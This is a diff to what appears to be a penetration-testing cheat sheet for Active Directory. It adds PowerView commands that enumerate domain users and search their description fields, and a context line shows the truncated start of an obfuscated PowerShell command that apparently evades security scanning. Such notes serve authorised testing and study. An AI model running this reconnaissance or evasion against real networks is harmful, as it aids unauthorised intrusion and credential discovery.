@@ -23,4 +23,17 @@ S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-
 
 ### Enumeration
 
+#### PowerView
+
+Get all the users
+```powershell
+Get-NetUser
+Get-NetUser | select -ExpandProperty samaccountname
+Get-NetUser -Credential $Cred | Format-Table name, samaccountname, userprincipalname, description
+Get-NetUser -Username student1
+Get-UserProperty -Properties pwdlastset
+Find-UserField -SearchField Description -SearchTerm "built"
+```
+
+
 ### Attack
